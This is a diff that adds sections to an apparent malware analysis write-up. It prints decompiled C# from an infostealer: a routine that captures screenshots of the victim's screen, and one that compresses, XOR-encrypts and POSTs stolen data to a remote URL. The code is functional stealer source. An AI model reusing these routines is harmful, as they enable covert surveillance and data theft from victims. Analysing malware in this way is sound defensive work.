@@ -343,6 +343,76 @@ private static int smethod_36(string userFolder)
 }
 ```
 
+Captures screenshots of the victim's screen.
+
+```
+private static void smethod_37()
+{
+    MemoryStream screenshotStream = new MemoryStream();
+    Graphics graphics = Graphics.FromHwnd(IntPtr.Zero);
+    IntPtr screenDevice = graphics.GetHdc();
+    int width = GetDeviceCaps(screenDevice, 118);
+    int height = GetDeviceCaps(screenDevice, 117);
+    graphics.ReleaseHdc(screenDevice);
+
+    using (Bitmap bitmap = new Bitmap(width, height))
+    {
+        using (Graphics screenCapture = Graphics.FromImage(bitmap))
+        {
+            screenCapture.CopyFromScreen(Point.Empty, Point.Empty, bitmap.Size);
+        }
+        bitmap.Save(screenshotStream, ImageFormat.Jpeg);
+    }
+    smethod_4(1, screenshotStream.GetBuffer(), Convert.ToInt32(screenshotStream.Length), "screenshot.jpg");
+}
+```
+
+Exfiltrates the stolen data over HTTP(S).
+
+```
+private static string smethod_49(string url, byte[] identifier, byte[] xorKey)
+{
+    try
+    {
+        byte[] dataToSend = memoryStream_0.ToArray();
+        using (MemoryStream compressedStream = new MemoryStream())
+        {
+            using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Compress))
+            {
+                gzipStream.Write(dataToSend, 0, dataToSend.Length);
+            }
+            dataToSend = compressedStream.ToArray();
+        }
+        dataToSend = smethod_2(dataToSend, dataToSend.Length, xorKey); // XOR encryption
+
+        WebRequest webRequest = WebRequest.Create(url);
+        webRequest.Method = "POST";
+        webRequest.ContentLength = dataToSend.Length + 33;
+        
+        using (Stream requestStream = webRequest.GetRequestStream())
+        {
+            requestStream.Write(identifier, 0, 32);
+            requestStream.Write(Encoding.ASCII.GetBytes("|"), 0, 1);
+            requestStream.Write(dataToSend, 0, dataToSend.Length);
+        }
+
+        using (WebResponse response = webRequest.GetResponse())
+        using (Stream responseStream = response.GetResponseStream())
+        using (StreamReader reader = new StreamReader(responseStream))
+        {
+            return reader.ReadToEnd();
+        }
+    }
+    catch (Exception ex)
+    {
+        smethod_5("Error: " + ex.Message);
+    }
+    return "";
+}
+```
+
+
+
 
 
 
